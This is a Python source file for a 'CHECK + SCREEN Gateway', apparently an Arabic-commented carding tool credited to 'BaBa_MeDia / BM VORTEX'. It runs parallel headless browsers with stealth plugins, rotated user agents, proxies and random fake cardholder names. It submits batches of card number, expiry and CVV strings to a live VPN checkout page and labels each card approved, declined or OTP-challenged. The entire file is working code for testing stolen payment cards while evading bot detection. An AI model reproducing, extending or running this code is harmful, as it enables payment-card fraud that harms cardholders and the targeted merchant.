"""
gate_cs.py — CHECK + SCREEN Gateway
Playwright-stealth card checker for order.veepn.com
Sessions: CS_MAX_PARALLEL parallel browsers, each handling CS_SESSION_SIZE cards sequentially
Returns screenshots for every meaningful response (OTP bank screen, success, error).

Author: BaBa_MeDia / BM VORTEX
"""

import asyncio
import threading
import re
import time
import random
import logging
import io

logger = logging.getLogger(__name__)

# ─── Config ────────────────────────────────────────────────────────────────────
CS_TARGET_URL   = "https://order.veepn.com/en/vpn/buy/monthly"
CS_EMAIL        = "test@gmail.com"    # الإيميل الثابت — غيّره لو محتاج
CS_SESSION_SIZE = 5                   # كروت لكل جلسة (browser واحد)
CS_MAX_PARALLEL = 3                   # أقصى جلسات متوازية

# ─── User-Agents ───────────────────────────────────────────────────────────────
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
]

_RANDOM_NAMES = [
    "James Smith", "Emily Johnson", "Michael Brown", "Sarah Davis",
    "Robert Wilson", "Jessica Moore", "William Taylor", "Ashley Anderson",
    "David Thomas", "Amanda Jackson", "Joseph White", "Megan Harris",
]

# ─── Proxy parser ──────────────────────────────────────────────────────────────
def _parse_proxy_for_playwright(proxy_str):
    """
    Convert any proxy string to Playwright proxy dict.
    Handles: socks5h://user:pass@host:port  /  http://user:pass@host:port  /  user:pass@host:port
    Returns None if unparseable.
    """
    if not proxy_str:
        return None
    s = str(proxy_str).strip()

    # socks5h:// or socks5://
    m = re.match(r'socks5h?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        # Playwright/Chromium does not support SOCKS5 proxies.
        # Bright Data offers HTTP on port 22225 as an alternative to its
        # SOCKS5 port (22228). Convert the proxy to HTTP when possible.
        if host.endswith('.superproxy.io') and port == '22228':
            return {"server": f"http://{host}:22225", "username": user, "password": passwd}
        return {"server": f"socks5://{host}:{port}", "username": user, "password": passwd}

    # http:// or https://
    m = re.match(r'https?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        scheme = s.split('://')[0]
        user, passwd, host, port = m.groups()
        return {"server": f"{scheme}://{host}:{port}", "username": user, "password": passwd}

    # user:pass@host:port  (no scheme)
    m = re.match(r'([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        return {"server": f"http://{host}:{port}", "username": user, "password": passwd}

    return None

# ─── Core async session ─────────────────────────────────────────────────────────
async def _session_async(cards, email, proxy_dict, on_result, is_stopped_fn=None):
    """
    One browser session: open once, process `cards` one by one.
    on_result(card, status, reason, screenshot_bytes_or_None) called for each card.
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        logger.error("[CS] playwright not installed!")
        for card in cards:
            await on_result(card, "ERROR", "playwright not installed", None)
        return

    # try stealth
    try:
        from playwright_stealth import stealth_async
        _has_stealth = True
    except ImportError:
        _has_stealth = False
        logger.warning("[CS] playwright-stealth not installed — running without stealth")

    launch_kwargs = {
        "headless": True,
        "args": [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-dev-shm-usage",
        ],
    }
    if proxy_dict:
        launch_kwargs["proxy"] = proxy_dict

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(**launch_kwargs)
        context = await browser.new_context(
            user_agent=random.choice(_UA_POOL),
            viewport={"width": 1366, "height": 768},
            locale="en-US",
            timezone_id="America/New_York",
            java_script_enabled=True,
            accept_downloads=False,
        )
        page = await context.new_page()

        if _has_stealth:
            await stealth_async(page)

        for card_str in cards:
            if is_stopped_fn and is_stopped_fn():
                break

            parts = card_str.split('|')
            if len(parts) != 4:
                await on_result(card_str, "ERROR", "صيغة كارت خاطئة", None)
                continue

            cc, month, year, cvv = parts
            if len(year) == 2:
                year = "20" + year

            cardholder = random.choice(_RANDOM_NAMES)
            screenshot = None
            try:
                status, reason, screenshot = await _check_card_on_page(
                    page, cc, month, year, cvv, email, cardholder
                )
            except Exception as e:
                status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:100]}"
                try:
                    screenshot = await page.screenshot(full_page=False)
                except Exception:
                    pass

            await on_result(card_str, status, reason, screenshot)
            await asyncio.sleep(0.5)  # small pause between cards

        await browser.close()


async def _check_card_on_page(page, cc, month, year, cvv, email, cardholder):
    """Fill one card and detect result. Returns (status, reason, screenshot_bytes)."""
    from playwright.async_api import TimeoutError as PWT

    # ── Navigate ──────────────────────────────────────────────────────────────
    try:
        await page.goto(CS_TARGET_URL, wait_until="domcontentloaded", timeout=35000)
        await page.wait_for_timeout(2500)
    except Exception as e:
        screenshot = await _safe_screenshot(page)
        return "ERROR", f"تعذر فتح الصفحة: {str(e)[:80]}", screenshot

    # ── Close overlay/popup if visible ────────────────────────────────────────
    try:
        close_btn = page.locator('img[alt="x close"]').first
        if await close_btn.is_visible(timeout=3000):
            await close_btn.click()
            await page.wait_for_timeout(800)
    except Exception:
        pass

    # ── Fill email ────────────────────────────────────────────────────────────
    try:
        email_sel = 'input[type="email"], input.custom-input__input[type="email"]'
        email_inp = page.locator(email_sel).first
        await email_inp.wait_for(state="visible", timeout=12000)
        current_val = await email_inp.input_value()
        if not current_val:
            await email_inp.fill(email)
        await page.wait_for_timeout(400)
    except Exception as e:
        screenshot = await _safe_screenshot(page)
        return "ERROR", f"حقل الإيميل: {str(e)[:80]}", screenshot

    # ── Detect which scenario ─────────────────────────────────────────────────
    scenario = await _detect_scenario(page)

    if scenario == "B":
        fill_ok, err_reason, err_ss = await _fill_scenario_b(
            page, cc, month, year, cvv, cardholder
        )
        if not fill_ok:
            return "ERROR", err_reason, err_ss
        return await _wait_and_detect(page)

    elif scenario in ("A", "A_OPEN"):
        fill_ok, err_reason, err_ss = await _fill_scenario_a(
            page, cc, month, year, cvv, cardholder, already_open=(scenario == "A_OPEN")
        )
        if not fill_ok:
            return "ERROR", err_reason, err_ss
        clicked = await _click_submit_a(page)
        if not clicked:
            screenshot = await _safe_screenshot(page)
            return "ERROR", "تعذر الضغط على زر الإكمال", screenshot
        return await _wait_and_detect(page)

    else:
        screenshot = await _safe_screenshot(page)
        return "ERROR", "تعذر تحديد سيناريو الدفع في الصفحة", screenshot


async def _detect_scenario(page):
    """Return 'A', 'A_OPEN', 'B', or None."""
    # Check for direct card fields first (B popup already open)
    try:
        direct = page.locator('input[name="cardNumber"]').first
        if await direct.is_visible(timeout=2000):
            return "B"
    except Exception:
        pass

    # Check if y.uno pan iframe already visible (A open)
    try:
        pan_frame = page.frame_locator('iframe[title="pan"]')
        pan_inp = pan_frame.locator('input').first
        if await pan_inp.is_visible(timeout=2000):
            return "A_OPEN"
    except Exception:
        pass

    # Check if expansion panel exists (A closed)
    try:
        exp = page.locator('#payment_form_26, .expansion-panel.step-payment__expansion').first
        if await exp.is_visible(timeout=5000):
            return "A"
    except Exception:
        pass

    # Check for "Subscribe now" / complete purchase button → probably B scenario
    try:
        sub_btn = page.locator('button:has-text("إكمال الشراء"), button:has-text("Subscribe")').first
        if await sub_btn.is_visible(timeout=3000):
            return "B"
    except Exception:
        pass

    return None


async def _fill_scenario_a(page, cc, month, year, cvv, cardholder, already_open=False):
    """Scenario A: expansion panel with y.uno iframes. Returns (ok, reason, screenshot)."""
    if not already_open:
        try:
            header = page.locator('#payment_form_26 .expansion-panel__header, '
                                   '.step-payment__expansion .expansion-panel__header').first
            if await header.is_visible(timeout=5000):
                await header.click()
                await page.wait_for_timeout(2000)
        except Exception:
            pass

    # ── Card number ───────────────────────────────────────────────────────────
    try:
        pan_frame = page.frame_locator('iframe[title="pan"]')
        pan_inp   = pan_frame.locator('input').first
        await pan_inp.wait_for(state="visible", timeout=12000)
        await pan_inp.click()
        await pan_inp.type(cc, delay=45)
        await page.wait_for_timeout(400)
    except Exception as e:
        ss = await _safe_screenshot(page)
        return False, f"حقل رقم الكارت (iframe): {str(e)[:80]}", ss

    # ── Expiry ────────────────────────────────────────────────────────────────
    try:
        exp_frame = page.frame_locator('iframe[title="expiration"]')
        exp_inp   = exp_frame.locator('input').first
        await exp_inp.wait_for(state="visible", timeout=8000)
        await exp_inp.click()
        await exp_inp.type(f"{month}/{year[-2:]}", delay=45)
        await page.wait_for_timeout(400)
    except Exception as e:
        ss = await _safe_screenshot(page)
        return False, f"حقل التاريخ (iframe): {str(e)[:80]}", ss

    # ── CVV ───────────────────────────────────────────────────────────────────
    try:
        cvv_frame = page.frame_locator('iframe[title="cvv"]')
        cvv_inp   = cvv_frame.locator('input').first
        await cvv_inp.wait_for(state="visible", timeout=8000)
        await cvv_inp.click()
        await cvv_inp.type(cvv, delay=45)
        await page.wait_for_timeout(400)
    except Exception as e:
        ss = await _safe_screenshot(page)
        return False, f"حقل CVV (iframe): {str(e)[:80]}", ss

    # ── Cardholder name ───────────────────────────────────────────────────────
    try:
        name_inp = page.locator('input[name="cardHolderName"]').first
        if await name_inp.is_visible(timeout=3000):
            await name_inp.fill(cardholder)
            await page.wait_for_timeout(300)
    except Exception:
        pass

    return True, "", None


async def _click_submit_a(page):
    """Click the main submit button (Scenario A). Returns True if clicked."""
    for sel in [
        'button.payment-form__submit',
        'button:has-text("إكمال الشراء")',
        '.payment-form__submit',
    ]:
        try:
            btn = page.locator(sel).first
            if await btn.is_visible(timeout=3000):
                await btn.click()
                return True
        except Exception:
            pass
    return False


async def _fill_scenario_b(page, cc, month, year, cvv, cardholder):
    """
    Scenario B: click 'إكمال الشراء' to open popup, then fill direct inputs.
    Returns (ok, reason, screenshot).
    """
    # Click the purchase button to open popup
    try:
        btn_sel = ('button:has-text("إكمال الشراء"), '
                   'button .base-button__inner:has-text("إكمال الشراء")')
        btn = page.locator(btn_sel).first
        await btn.wait_for(state="visible", timeout=8000)
        await btn.click()
        await page.wait_for_timeout(2500)
    except Exception as e:
        ss = await _safe_screenshot(page)
        return False, f"تعذر فتح نافذة الدفع: {str(e)[:80]}", ss

    # ── Card number ───────────────────────────────────────────────────────────
    try:
        card_inp = page.locator('input[name="cardNumber"]').first
        await card_inp.wait_for(state="visible", timeout=10000)
        await card_inp.fill(cc)
        await page.wait_for_timeout(300)
    except Exception as e:
        ss = await _safe_screenshot(page)
        return False, f"حقل رقم الكارت (B): {str(e)[:80]}", ss

    # ── Expiry ────────────────────────────────────────────────────────────────
    try:
        exp_inp = page.locator('input[name="expiry"]').first
        await exp_inp.wait_for(state="visible", timeout=5000)
        await exp_inp.type(f"{month} / {year[-2:]}", delay=40)
        await page.wait_for_timeout(300)
    except Exception:
        pass

    # ── CVV ───────────────────────────────────────────────────────────────────
    try:
        cvv_inp = page.locator('input[name="cvv"]').first
        await cvv_inp.wait_for(state="visible", timeout=5000)
        await cvv_inp.fill(cvv)
        await page.wait_for_timeout(300)
    except Exception:
        pass

    # ── Cardholder ────────────────────────────────────────────────────────────
    try:
        holder_inp = page.locator('input[name="cardHolder"]').first
        if await holder_inp.is_visible(timeout=3000):
            await holder_inp.fill(cardholder)
            await page.wait_for_timeout(300)
    except Exception:
        pass

    # ── Subscribe now ─────────────────────────────────────────────────────────
    try:
        sub_btn = page.locator(
            'button:has-text("Subscribe now"), '
            'button span:has-text("Subscribe now"), '
            'span[translate="no"]:has-text("Subscribe now")'
        ).first
        await sub_btn.wait_for(state="visible", timeout=8000)
        await sub_btn.click()
    except Exception as e:
        ss = await _safe_screenshot(page)
        return False, f"تعذر الضغط على Subscribe now: {str(e)[:80]}", ss

    return True, "", None


async def _wait_and_detect(page):
    """Wait for page to settle after submit, then detect result + take screenshot."""
    await page.wait_for_timeout(4000)
    try:
        await page.wait_for_load_state("networkidle", timeout=18000)
    except Exception:
        pass
    await page.wait_for_timeout(2000)

    screenshot = await _safe_screenshot(page)

    # ── Detect result ─────────────────────────────────────────────────────────
    url = page.url.lower()

    # Check all frames for bank/OTP signals
    for frame in page.frames:
        fu = frame.url.lower()
        if any(k in fu for k in ["acs", "3dsec", "threeds", "mdpayacs", "acspage",
                                   "authentication", "challenge", "secure3d"]):
            return "OTP", f"شاشة بنك OTP اكتُشفت: {frame.url[:80]}", screenshot

    # Page content analysis
    try:
        content = await page.content()
        cl = content.lower()
    except Exception:
        cl = url

    # 3DS / OTP page
    otp_kw = ["3d secure", "authentication", "verify your", "otp", "one-time",
               "sms code", "security code", "bank verification", "تحقق", "رمز",
               "acs", "challenge", "please enter your"]
    if any(k in cl for k in otp_kw):
        return "OTP", "شاشة 3D Secure / OTP ظهرت", screenshot

    # Success page
    success_kw = ["success", "thank you", "confirmed", "شكراً", "payment successful",
                  "subscription active", "welcome to", "your order", "activated",
                  "تم الدفع", "اشتراكك نشط", "تمت العملية"]
    if any(k in cl for k in success_kw) or "success" in url or "thank" in url:
        return "APPROVED", "تمت الموافقة / صفحة نجاح", screenshot

    # Declined
    declined_kw = ["declined", "مرفوضة", "invalid card", "card error",
                   "card was declined", "payment failed", "insufficient funds",
                   "error processing", "رفض", "البطاقة غير صالحة"]
    if any(k in cl for k in declined_kw):
        return "DECLINED", "البطاقة مرفوضة", screenshot

    return "UNKNOWN", "رد غير محدد — شاهد الاسكرين شوت", screenshot


async def _safe_screenshot(page):
    """Take screenshot, return bytes or None."""
    try:
        return await page.screenshot(full_page=False, timeout=8000)
    except Exception:
        return None


# ─── Sync wrappers ─────────────────────────────────────────────────────────────

def check_cs_card_sync(card_str, email, get_proxy_fn=None):
    """
    Check a single card. Returns (status, reason, screenshot_bytes_or_None).
    get_proxy_fn: callable that returns a proxy string (or None).
    """
    result = [("ERROR", "لم تكتمل أي محاولة", None)]

    async def on_result(card, status, reason, screenshot):
        result[0] = (status, reason, screenshot)

    proxy_str  = get_proxy_fn() if callable(get_proxy_fn) else None
    proxy_dict = _parse_proxy_for_playwright(proxy_str)

    try:
        asyncio.run(_session_async([card_str], email, proxy_dict, on_result))
    except Exception as e:
        logger.error(f"[CS] check_cs_card_sync error: {e}")
        result[0] = ("ERROR", f"{type(e).__name__}: {str(e)[:80]}", None)

    return result[0]


def run_cs_sessions(cards, email, get_proxy_fn, on_result_cb, is_stopped_fn=None):
    """
    Runs all cards using session batching:
      - Divides cards into batches of CS_SESSION_SIZE
      - Runs up to CS_MAX_PARALLEL batches in parallel threads
      - Calls on_result_cb(card, status, reason, screenshot) for each card

    get_proxy_fn: callable → proxy string (called once per session)
    is_stopped_fn: callable → bool (checked between cards)
    """
    batches = [cards[i:i + CS_SESSION_SIZE]
               for i in range(0, len(cards), CS_SESSION_SIZE)]

    semaphore = threading.Semaphore(CS_MAX_PARALLEL)
    threads   = []

    def run_batch(batch):
        with semaphore:
            if is_stopped_fn and is_stopped_fn():
                return
            proxy_str  = get_proxy_fn() if callable(get_proxy_fn) else None
            proxy_dict = _parse_proxy_for_playwright(proxy_str)

            result_buf = []

            async def _on_result(card, status, reason, screenshot):
                result_buf.append((card, status, reason, screenshot))

            def _is_stopped():
                return bool(is_stopped_fn and is_stopped_fn())

            try:
                asyncio.run(_session_async(batch, email, proxy_dict, _on_result, _is_stopped))
            except Exception as e:
                logger.error(f"[CS] batch error: {e}")
                for card in batch:
                    if not any(r[0] == card for r in result_buf):
                        result_buf.append((card, "ERROR", f"Session error: {str(e)[:60]}", None))

            for card, status, reason, screenshot in result_buf:
                try:
                    on_result_cb(card, status, reason, screenshot)
                except Exception as ex:
                    logger.error(f"[CS] on_result_cb error: {ex}")

    for batch in batches:
        t = threading.Thread(target=run_batch, args=(batch,), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
